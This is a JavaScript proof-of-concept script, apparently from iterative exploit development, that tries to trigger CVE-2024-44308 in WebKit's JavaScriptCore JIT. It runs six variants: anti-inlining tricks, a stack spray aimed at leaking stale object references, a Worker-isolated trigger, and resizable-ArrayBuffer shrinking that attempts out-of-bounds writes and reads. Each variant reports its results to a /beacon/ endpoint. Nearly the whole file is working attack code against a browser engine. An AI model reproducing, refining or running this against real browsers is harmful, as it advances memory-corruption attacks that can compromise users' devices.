/* p101-44308v2 — CVE-2024-44308 with anti-inlining + correct observation
 *
 * Key fixes from p100:
 * 1. The stored value IS correct — the stale register is NOT used for the store
 * 2. The stale register is used by SUBSEQUENT code (property access, bounds check)
 * 3. noInline() is JSC shell-only — need try-catch barriers + function size padding
 * 4. Variable index forces bounds-check path where scratch2GPR matters
 * 5. Must have operations AFTER the store that read the stale register
 *
 * Beacon prefix: V101E-
 */
(function(){
"use strict";
var RUN_ID = "v101e" + Math.random().toString(36).slice(2,12);
var PREFIX = "V101E-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press101-44308v2");

/* ====== E1: Anti-inlining via try-catch + variable index ====== */
function test_E1() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, {maxByteLength: 1024});
    var intArray = new Int32Array(rab);

    // Anti-inlining: try-catch in caller prevents DFG from inlining callee
    // Variable index forces bounds checking (scratch2GPR path)
    // Property access AFTER store reads potentially stale register

    var idx = 0;
    var marker = {a: 0xBEEF, b: 0xDEAD, c: 0xCAFE, d: 0xF00D};

    // Target function — padded to prevent inlining
    // The property access after the store is what reads the stale register
    function opt(val, obj, i) {
      var x0 = val, x1 = val, x2 = val, x3 = val;
      var x4 = val, x5 = val, x6 = val, x7 = val;
      x0 = x1 + x2; x3 = x4 + x5; x6 = x7 + x0;
      intArray[i] = val;  // Store to RAB typed array with variable index
      return obj.a;       // Property access that may use stale register
    }

    // Warmup with floats and variable index
    for (var i = 0; i < 100000; i++) {
      try {
        idx = i & 63;
        opt(i + 1337.1337, marker, idx);
      } catch(e) {}
    }
    r.warmupDone = true;

    // Trigger
    try {
      var result = opt(13371337133713371337.1337, marker, 0);
      r.result = result;
      r.resultType = typeof result;
      r.expected = 0xBEEF;
      r.MATCH = (result === 0xBEEF);
      if (typeof result === 'number' && result !== 0xBEEF) {
        r.ANOMALY = true;
        r.resultHex = result.toString(16);
      }
    } catch(e) {
      r.triggerErr = e.name + ':' + e.message.slice(0,40);
      r.CRASHED_IN_TRIGGER = true;
    }

    r.SURVIVED = true;
    B("E1-ANTICACHE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("E1-ERR", r); }
}

/* ====== E2: Exodus-style stack spray with anti-inlining ====== */
function test_E2() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, {maxByteLength: 1024});
    var intArray = new Int32Array(rab);

    // Objects with different structures for type confusion detection
    var oj = {};
    oj._padding1 = 0; oj._padding2 = 0; oj._padding3 = 0; oj._padding4 = 0;
    oj.a = 378 * Number.MIN_VALUE; // float property

    var oj1 = {};
    oj1.a = 42; oj1.b = 0; oj1.c = 0; oj1.d = 0;

    var victim = {};
    victim.a = 0x41414141; victim.b = 0; victim.c = 0; victim.d = 0;

    // Stack spray function — fills stack with controlled layout
    // Padded heavily to prevent inlining
    function opt1(ary, ary1, _p1, _p2, _p3, _p4, _p5, _p6) {
      var l0 = ary, l1 = ary1, l2 = ary, l3 = ary1;
      var l4 = ary, l5 = ary1, l6 = ary, l7 = ary1;
      var l8 = _p1, l9 = _p2, lA = _p3, lB = _p4;
      l0; l1; l2; l3; l4; l5; l6; l7; l8; l9; lA; lB;
      void(l0 + l2 + l4 + l6);
      intArray[0] = ary;
      return ary1.a;
    }

    // Trigger function — same structure, reads stale value
    function opt(ary, ary1, _p1, _p2, _p3, _p4, _p5, _p6) {
      var l0 = ary, l1 = ary1, l2 = ary, l3 = ary1;
      var l4 = ary, l5 = ary1, l6 = ary, l7 = ary1;
      var l8 = _p1, l9 = _p2, lA = _p3, lB = _p4;
      l0; l1; l2; l3; l4; l5; l6; l7; l8; l9; lA; lB;
      void(l0 + l2 + l4 + l6);
      intArray[0] = ary;
      return ary1.a;
    }

    // Warm both functions separately (try-catch prevents inlining)
    for (var i = 0; i < 20000; i++) {
      try { opt1(i + 1337.1337, oj1, 0, 0, 0, 0, 0, 0); } catch(e) {}
    }
    for (var i = 0; i < 20000; i++) {
      try { opt(i + 1337.1337, oj, 0, 0, 0, 0, 0, 0); } catch(e) {}
    }
    r.warmupDone = true;

    // Stack set and trigger — try-catch around the combined call
    function triggerSequence(val, val1) {
      var a, b;
      try { a = opt1(1337.1337, val, 0, 0, 0, 0, 0, 0); } catch(e) {}
      try { b = opt(13371337133713371337.1337, val1, 0, 0, 0, 0, 0, 0); } catch(e) {}
      return b;
    }

    // Train triggerSequence
    for (var i = 0; i < 10000; i++) {
      triggerSequence(oj1, oj);
    }
    r.trainDone = true;

    // Actual trigger
    victim.a = oj1;
    var leaked;
    try {
      leaked = triggerSequence(oj1, oj);
    } catch(e) {
      r.triggerCrash = e.name + ':' + e.message.slice(0,40);
    }

    if (leaked !== undefined) {
      r.leakedType = typeof leaked;
      if (typeof leaked === 'number') {
        r.leakedVal = leaked;
        r.leakedHex = leaked > 0 ? leaked.toString(16) : leaked;
        r.LEAK = (leaked !== 378 * Number.MIN_VALUE);
      } else if (typeof leaked === 'object') {
        r.leakedIsNull = leaked === null;
        r.leakedIsOj = leaked === oj;
        r.leakedIsOj1 = leaked === oj1;
        r.leakedIsVictim = leaked === victim;
      }
    }
    r.SURVIVED = true;
    B("E2-EXODUS-V2", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("E2-ERR", r); }
}

/* ====== E3: Indirect call anti-inlining (call through array) ====== */
function test_E3() {
  var r = {};
  try {
    var rab = new ArrayBuffer(256, {maxByteLength: 1024});
    var intArray = new Int32Array(rab);

    var fns = [];

    // Create function via Function constructor (harder to inline)
    // Can't use eval in strict mode, but Function() works
    var storeAndRead = new Function('intArray', 'val', 'idx', 'obj',
      'var x0=val,x1=val,x2=val,x3=val,x4=val,x5=val,x6=val,x7=val;' +
      'x0=x1+x2;x3=x4+x5;x6=x7+x0;x1=x2+x3;x4=x5+x6;' +
      'intArray[idx] = val;' +
      'return obj.a;'
    );

    var marker = {a: 0xBEEF};

    // Warmup through indirect call
    for (var i = 0; i < 100000; i++) {
      storeAndRead(intArray, i + 1337.1337, i & 63, marker);
    }
    r.warmupDone = true;

    // Trigger
    var result = storeAndRead(intArray, 13371337133713371337.1337, 0, marker);
    r.result = result;
    r.MATCH = (result === 0xBEEF);
    r.SURVIVED = true;
    B("E3-INDIRECT", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("E3-ERR", r); }
}

/* ====== E4: Worker-based trigger (isolate from main thread inlining) ====== */
function test_E4() {
  var r = {};
  try {
    // Run the trigger in a Worker — separate JIT compilation context
    var workerCode = '(' + function() {
      var rab = new ArrayBuffer(256, {maxByteLength: 1024});
      var intArray = new Int32Array(rab);
      var marker = {a: 48879}; // 0xBEEF

      function opt(val, idx, obj) {
        var x0=val,x1=val,x2=val,x3=val,x4=val,x5=val,x6=val,x7=val;
        x0=x1+x2; x3=x4+x5; x6=x7+x0; x1=x2+x3;
        intArray[idx] = val;
        return obj.a;
      }

      for (var i = 0; i < 150000; i++) {
        opt(i + 1337.1337, i & 63, marker);
      }

      var result = opt(13371337133713371337.1337, 0, marker);
      postMessage({
        result: result,
        match: result === 48879,
        stored: intArray[0],
        survived: true
      });
    }.toString() + ')()';

    var blob = new Blob([workerCode], {type: 'text/javascript'});
    var url = URL.createObjectURL(blob);
    var w = new Worker(url);

    w.onmessage = function(e) {
      r.workerResult = e.data.result;
      r.workerMatch = e.data.match;
      r.workerStored = e.data.stored;
      r.WORKER_SURVIVED = e.data.survived;
      w.terminate();
      URL.revokeObjectURL(url);
      B("E4-WORKER", r);
    };

    w.onerror = function(e) {
      r.workerErr = e.message ? e.message.slice(0, 60) : 'error';
      r.WORKER_CRASHED = true;
      B("E4-WORKER", r);
    };

    setTimeout(function() {
      if (!r.WORKER_SURVIVED && !r.WORKER_CRASHED) {
        r.WORKER_TIMEOUT = true;
        B("E4-WORKER", r);
      }
    }, 8000);

  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("E4-ERR", r); }
}

/* ====== E5: Resizable AB resize during DFG execution ====== */
function test_E5() {
  var r = {};
  try {
    // The bug involves resizable arrays — try triggering by actually RESIZING
    // between warmup and trigger to invalidate DFG assumptions
    var rab = new ArrayBuffer(64, {maxByteLength: 4096});
    var intArray = new Int32Array(rab);
    var marker = {a: 0xCAFE};

    function opt5(val, idx, obj) {
      var x0=val,x1=val,x2=val,x3=val;
      x0=x1+x2; x3=x0+x1;
      intArray[idx] = val;
      return obj.a;
    }

    // Warmup at original size
    for (var i = 0; i < 100000; i++) {
      opt5(i + 0.5, i & 15, marker);
    }
    r.warmupDone = true;

    // Resize to much larger
    rab.resize(2048);
    r.resized = rab.byteLength;

    // Trigger after resize — DFG may have cached old length
    var result = opt5(13371337133713371337.1337, 256, marker);
    r.result = result;
    r.stored256 = intArray[256];
    r.MATCH = (result === 0xCAFE);

    // Try storing beyond original bounds but within new bounds
    var result2 = opt5(13371337133713371337.1337, 500, marker);
    r.result2 = result2;
    r.stored500 = intArray[500];

    r.SURVIVED = true;
    B("E5-RESIZE-TRIGGER", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("E5-ERR", r); }
}

/* ====== E6: Multiple resizes + OOB attempt ====== */
function test_E6() {
  B("E6-START", "oob-resize");
  var r = {};
  try {
    var rab = new ArrayBuffer(64, {maxByteLength: 4096});
    var intArray = new Int32Array(rab);

    function storeAtIdx(arr, idx, val) {
      var x0=val,x1=val,x2=val,x3=val,x4=val,x5=val;
      x0=x1+x2; x3=x4+x5; x0=x3+x1;
      arr[idx] = val;
    }

    // Warmup at size 64 (16 int32 elements)
    for (var i = 0; i < 100000; i++) {
      storeAtIdx(intArray, i & 15, i + 0.5);
    }

    // Shrink the buffer
    rab.resize(16); // only 4 int32 elements now
    r.shrunk = rab.byteLength;
    r.viewLen = intArray.length;

    // Try storing at index that WAS valid but ISN'T anymore
    // DFG might have cached the old length=16
    try {
      storeAtIdx(intArray, 10, 0x41414141);
      r.oobStore = "succeeded";
      r.val10 = intArray[10]; // Should be undefined if OOB
      r.OOB_WRITE = true;
    } catch(e) {
      r.oobErr = e.name;
    }

    // Check if we corrupted memory after the buffer
    // Read values beyond current length
    var vals = [];
    for (var j = 0; j < 20; j++) {
      vals.push(intArray[j]);
    }
    r.readBeyond = vals.join(',');

    r.SURVIVED = true;
    B("E6-OOB-RESIZE", r);
  } catch(e) { r.err = e.name + ":" + e.message.slice(0,60); B("E6-ERR", r); }
}

/* ====== Run ====== */
try {
  test_E1();                    // Anti-inlining + variable index (0ms)
  setTimeout(test_E2, 5000);    // Exodus v2 with try-catch barriers (5s)
  setTimeout(test_E3, 12000);   // Indirect call via Function() (12s)
  setTimeout(test_E4, 18000);   // Worker-based trigger (18s)
  setTimeout(test_E5, 28000);   // Resize during DFG (28s)
  setTimeout(test_E6, 35000);   // OOB via resize (35s)
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 4000);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe101-done"); }, 50000);
})();
